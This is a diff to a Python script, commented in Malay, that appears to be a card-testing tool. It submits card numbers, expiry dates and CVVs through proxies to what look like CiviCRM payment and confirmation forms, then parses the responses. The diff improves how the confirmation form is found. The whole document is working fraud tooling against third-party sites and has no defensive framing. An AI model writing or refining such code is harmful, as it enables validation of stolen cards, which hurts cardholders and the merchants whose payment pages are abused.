@@ -266,13 +266,16 @@ def process_site_for_payload(url, override_proxy=None):
     return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}
 
 def extract_confirmation_form(html, soup):
+    # Cari form yang ada input name="_qf_Confirm_next"
     confirm_form = soup.find('form', {'id': 'Confirm'})
     if not confirm_form:
-        possible_forms = soup.find_all('form')
-        if possible_forms:
-            confirm_form = possible_forms[0]
-        else:
-            return None, None, None
+        for form in soup.find_all('form'):
+            if form.find('input', {'name': '_qf_Confirm_next'}) or form.find('button', {'name': '_qf_Confirm_next'}):
+                confirm_form = form
+                break
+    
+    if not confirm_form:
+        return None, None, None
 
     new_qfkey_input = confirm_form.find('input', {'name': 'qfKey'})
     new_qfkey = new_qfkey_input['value'] if new_qfkey_input and 'value' in new_qfkey_input.attrs else None
@@ -363,14 +366,14 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
             
+            # CARI FORM CONFIRM YANG BETUL
             confirm_form = soup_resp.find('form', {'id': 'Confirm'})
             if not confirm_form:
-                possible_forms = soup_resp.find_all('form')
-                if possible_forms:
-                    confirm_form = possible_forms[0]
-                    logging.info("Confirm Form tak jumpa ID, pakai form pertama")
-                else:
-                    logging.info("Confirm Form tak jumpa langsung!")
+                for form in soup_resp.find_all('form'):
+                    if form.find('input', {'name': '_qf_Confirm_next'}) or form.find('button', {'name': '_qf_Confirm_next'}):
+                        confirm_form = form
+                        logging.info("Jumpa Confirm Form melalui input _qf_Confirm_next")
+                        break
             
             if confirm_form:
                 confirm_action = confirm_form.get('action')
@@ -395,13 +398,13 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
 
                 clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=qfkey_to_use)
                 
-                # CONFIRMATION PAGE GUNA URL ENCODED BIASA
                 confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
                 
                 logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
                 
                 result = parse_response(confirm_response.text, confirm_response.url)
             else:
+                logging.info("Confirm Form tak jumpa langsung!")
                 result = parse_response(response.text, response.url)
             
             if 'session has expired' in result.get('message', '').lower() or 'unable to complete' in result.get('message', '').lower():
